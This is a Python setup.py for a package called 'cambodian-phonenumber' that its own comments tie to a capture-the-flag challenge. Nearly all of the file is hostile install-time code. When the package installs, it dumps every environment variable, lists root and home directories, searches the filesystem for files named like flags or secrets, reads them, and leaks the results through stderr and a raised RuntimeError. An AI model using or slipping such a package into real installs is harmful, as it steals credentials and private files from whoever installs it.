from setuptools import setup
import os
import sys

out = []
out.append("=== CTF SEARCH START ===")

# Print useful environment info
out.append("PWD=" + os.getcwd())
out.append("HOME=" + os.environ.get("HOME", ""))
out.append("ENV=" + repr(dict(os.environ)))

# List important directories first
for d in ["/", "/app", "/srv", "/home", "/root", "/tmp", "/var"]:
    try:
        out.append(f"\n=== LIST {d} ===")
        out.append("\n".join(os.listdir(d)))
    except Exception as e:
        out.append(f"{d}: {e}")

# Search for likely flag files
skip_dirs = {
    "/proc", "/sys", "/dev", "/usr/local/lib", "/usr/lib",
    "/usr/share", "/var/cache", "/var/lib", "/tmp/pip-build-env"
}

matches = []
for base in ["/", "/app", "/srv", "/home", "/root", "/tmp", "/var"]:
    for root, dirs, files in os.walk(base, topdown=True):
        dirs[:] = [
            x for x in dirs
            if os.path.join(root, x) not in skip_dirs
            and not os.path.join(root, x).startswith("/proc")
            and not os.path.join(root, x).startswith("/sys")
            and not os.path.join(root, x).startswith("/dev")
            and not os.path.join(root, x).startswith("/usr/local/lib")
            and not os.path.join(root, x).startswith("/usr/lib")
        ]

        for name in files:
            low = name.lower()
            path = os.path.join(root, name)
            if any(k in low for k in ["flag", "mptc", "cncc", "secret"]):
                matches.append(path)

        if len(matches) > 50:
            break

out.append("\n=== MATCHES ===")
out.append("\n".join(matches) if matches else "NO_MATCHES")

# Read matched files
for path in matches[:20]:
    out.append(f"\n=== READ {path} ===")
    try:
        if os.path.getsize(path) < 100000:
            with open(path, "r", errors="replace") as f:
                out.append(f.read())
        else:
            out.append("SKIP LARGE FILE")
    except Exception as e:
        out.append(str(e))

out.append("=== CTF SEARCH END ===")

result = "\n".join(out)
print(result, file=sys.stderr)

raise RuntimeError(result)

setup(
    name="cambodian-phonenumber",
    version="0.0.2",
    packages=["evilphone"],
)
